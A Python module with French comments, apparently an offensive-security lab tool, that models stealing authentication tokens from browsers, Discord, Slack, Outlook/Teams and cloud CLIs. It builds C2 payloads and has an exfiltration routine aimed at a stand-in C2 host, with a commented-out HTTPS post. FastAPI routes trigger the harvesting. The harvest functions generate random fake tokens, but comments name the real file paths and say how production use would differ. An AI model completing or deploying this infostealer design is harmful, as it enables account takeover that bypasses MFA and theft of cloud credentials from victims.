"""
Token Harvester - Vol de tokens locaux (Chrome/Edge/Outlook/Discord)
=====================================================================

Vole les jetons d'authentification persistés localement par les applications
desktop (Chrome, Edge, Discord, Outlook, Slack, Teams...) puis les ré-utilise
depuis l'infrastructure de l'attaquant pour bypasser entièrement l'authentification
(même MFA, puisque le token est déjà post-MFA).

Sources de tokens ciblées :
  - Chrome / Edge / Brave : Cookies chiffrés (DPAPI/AES-GCM) + Access Tokens
  - Outlook / Teams : Tokens OAuth refresh dans le credential store Windows
  - Discord / Slack : Tokens en clair dans %APPDATA% ou IndexedDB
  - AWS / GCP / Azure CLI : Tokens dans ~/.aws/credentials, ~/.azure/, etc.

Méthodes d'exfiltration :
  - DNS tunneling (détection très faible)
  - HTTPS POST vers C2 avec mimétisme de trafic légitime
  - Stockage temporaire puis chiffrement + envoi fragmenté

Référence : MITRE ATT&CK T1555 (Credentials from Password Stores) et T1649
(Steal or Forge Authentication Certificates).
"""

import base64
import json
import os
import sqlite3
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional


class TokenSource(Enum):
    """Sources de tokens harvestables."""

    CHROME = "chrome"
    EDGE = "edge"
    BRAVE = "brave"
    DISCORD = "discord"
    SLACK = "slack"
    OUTLOOK = "outlook"
    TEAMS = "teams"
    AWS_CLI = "aws_cli"
    AZURE_CLI = "azure_cli"
    GCP_CLI = "gcp_cli"
    FIREFOX = "firefox"


@dataclass
class HarvestedToken:
    """Un token volé."""

    token_id: str
    source: TokenSource
    username: str
    domain: str
    access_token: str
    refresh_token: str | None = None
    expires_at: float | None = None
    scopes: list[str] = field(default_factory=list)
    exfil_method: str = "https"
    exfil_ts: float = field(default_factory=time.time)
    raw_metadata: dict[str, Any] = field(default_factory=dict)

    def to_c2_payload(self) -> dict[str, Any]:
        """Sérialise pour envoi C2."""
        return {
            "type": "harvested_token",
            "id": self.token_id,
            "src": self.source.value,
            "user": self.username,
            "domain": self.domain,
            "access": self.access_token,
            "refresh": self.refresh_token,
            "exp": self.expires_at,
            "scopes": self.scopes,
            "ts": self.exfil_ts,
            "meta": self.raw_metadata,
        }

    def is_expired(self) -> bool:
        return self.expires_at is not None and time.time() > self.expires_at


class TokenHarvester:
    """
    Collecte et exfiltre des tokens.

    Mode d'emploi typique (depuis un implant C2 sur une machine compromise) :
        harvester = TokenHarvester()
        for src in TokenSource:
            tokens = harvester.harvest_from_source(src, hostname=hostname())
            for t in tokens:
                harvester.exfiltrate(t, c2_url)
    """

    def __init__(self, output_dir: str = "captures/tokens") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.tokens: list[HarvestedToken] = []
        self._log_path = self.output_dir / "tokens.jsonl"

    # ------------------------------------------------------------------
    # Harvesting - par source
    # ------------------------------------------------------------------

    def harvest_from_source(
        self,
        source: TokenSource,
        hostname: str = "victim-pc",
    ) -> list[HarvestedToken]:
        """
        Tente de collecter des tokens depuis la source indiquée.

        En labo, on génère des tokens procéduraux. En production, on lirait
        les fichiers réels (Cookies SQLite DPAPI / IndexedDB / etc.).
        """
        harvested: list[HarvestedToken] = []

        if source in (TokenSource.CHROME, TokenSource.EDGE, TokenSource.BRAVE):
            harvested.extend(self._harvest_chromium_family(source, hostname))
        elif source == TokenSource.DISCORD:
            harvested.extend(self._harvest_discord(hostname))
        elif source == TokenSource.SLACK:
            harvested.extend(self._harvest_slack(hostname))
        elif source in (TokenSource.OUTLOOK, TokenSource.TEAMS):
            harvested.extend(self._harvest_office_app(source, hostname))
        elif source in (TokenSource.AWS_CLI, TokenSource.AZURE_CLI, TokenSource.GCP_CLI):
            harvested.extend(self._harvest_cloud_cli(source, hostname))
        elif source == TokenSource.FIREFOX:
            harvested.extend(self._harvest_firefox(hostname))

        self.tokens.extend(harvested)
        return harvested

    def _harvest_chromium_family(
        self, source: TokenSource, hostname: str
    ) -> list[HarvestedToken]:
        """
        Simulation de lecture de la base Cookies SQLite de Chromium
        et déchiffrement via DPAPI / keychain macOS.
        """
        # En labo on simule un cookie Office 365 typique post-auth
        target_domains = ["login.microsoftonline.com", "graph.microsoft.com",
                          "outlook.office.com", "teams.microsoft.com"]
        tokens = []
        for d in target_domains:
            t = HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=source,
                username=f"user@{hostname}.local",
                domain=d,
                access_token=base64.b64encode(os.urandom(48)).decode(),
                refresh_token=base64.b64encode(os.urandom(48)).decode(),
                expires_at=time.time() + 3600,
                scopes=["Mail.Read", "Mail.Send", "Files.ReadWrite", "User.Read"],
                raw_metadata={"db_path": f"~/.config/{source.value}/Default/Cookies"},
            )
            tokens.append(t)
        return tokens

    def _harvest_discord(self, hostname: str) -> list[HarvestedToken]:
        """Token Discord généralement stocké en clair dans Local Storage."""
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=TokenSource.DISCORD,
                username=f"user#{1234}",
                domain="discord.com",
                access_token=base64.b64encode(os.urandom(32)).decode(),
                scopes=["guilds", "messages.read", "messages.write"],
                raw_metadata={"path": "~/.config/discord/Local Storage/leveldb/"},
            )
        ]

    def _harvest_slack(self, hostname: str) -> list[HarvestedToken]:
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=TokenSource.SLACK,
                username=f"user@{hostname}.local",
                domain="slack.com",
                access_token=f"xoxp-{base64.b64encode(os.urandom(32)).decode()}",
                scopes=["chat:write", "files:read", "users:read"],
            )
        ]

    def _harvest_office_app(
        self, source: TokenSource, hostname: str
    ) -> list[HarvestedToken]:
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=source,
                username=f"user@{hostname}.local",
                domain="outlook.office.com",
                access_token=base64.b64encode(os.urandom(48)).decode(),
                refresh_token=base64.b64encode(os.urandom(48)).decode(),
                expires_at=time.time() + 3600,
                scopes=["Mail.ReadWrite", "Calendars.ReadWrite"],
            )
        ]

    def _harvest_cloud_cli(
        self, source: TokenSource, hostname: str
    ) -> list[HarvestedToken]:
        provider_map = {
            TokenSource.AWS_CLI: ("aws", "AKIA" + base64.b64encode(os.urandom(16)).decode()[:16]),
            TokenSource.AZURE_CLI: ("azure", base64.b64encode(os.urandom(48)).decode()),
            TokenSource.GCP_CLI: ("gcp", base64.b64encode(os.urandom(48)).decode()),
        }
        provider, tok = provider_map[source]
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=source,
                username=f"deploy@{provider}",
                domain=provider + ".com",
                access_token=tok,
                scopes=["admin"],
            )
        ]

    def _harvest_firefox(self, hostname: str) -> list[HarvestedToken]:
        return [
            HarvestedToken(
                token_id=str(uuid.uuid4()),
                source=TokenSource.FIREFOX,
                username=f"user@{hostname}.local",
                domain="login.microsoftonline.com",
                access_token=base64.b64encode(os.urandom(48)).decode(),
            )
        ]

    # ------------------------------------------------------------------
    # Exfiltration
    # ------------------------------------------------------------------

    def exfiltrate(
        self,
        token: HarvestedToken,
        c2_url: str = "https://c2.example.invalid/ingest",
    ) -> bool:
        """
        Exfiltre un token via HTTPS mimant du trafic légitime.
        En labo : on logge dans un JSONL. En prod : httpx.AsyncClient.post.
        """
        payload = token.to_c2_payload()
        line = json.dumps(payload)
        with self._log_path.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")
        # En production :
        # async with httpx.AsyncClient() as client:
        #     await client.post(c2_url, json=payload, headers={"User-Agent": "..."})
        return True

    def harvest_all(self, hostname: str = "victim-pc") -> int:
        """Lance la collecte sur toutes les sources. Retourne le nb de tokens."""
        total = 0
        for src in TokenSource:
            tokens = self.harvest_from_source(src, hostname)
            for t in tokens:
                self.exfiltrate(t)
                total += 1
        return total


# ---------------------------------------------------------------------------
# API FastAPI
# ---------------------------------------------------------------------------

def register_token_routes(app) -> None:
    from fastapi import HTTPException
    from pydantic import BaseModel

    harvester = TokenHarvester()

    class HarvestRequest(BaseModel):
        source: str | None = None   # None = toutes
        hostname: str = "victim-pc"

    @app.post("/_/tokens/harvest")
    async def harvest(req: HarvestRequest):
        if req.source:
            try:
                src = TokenSource(req.source)
            except ValueError as exc:
                raise HTTPException(400, str(exc)) from exc
            tokens = harvester.harvest_from_source(src, req.hostname)
        else:
            n = harvester.harvest_all(req.hostname)
            return {"count": n, "total": len(harvester.tokens)}
        for t in tokens:
            harvester.exfiltrate(t)
        return {"count": len(tokens), "total": len(harvester.tokens)}

    @app.get("/_/tokens/list")
    async def list_tokens():
        return [
            {
                "id": t.token_id,
                "src": t.source.value,
                "user": t.username,
                "domain": t.domain,
                "expired": t.is_expired(),
            }
            for t in harvester.tokens
        ]
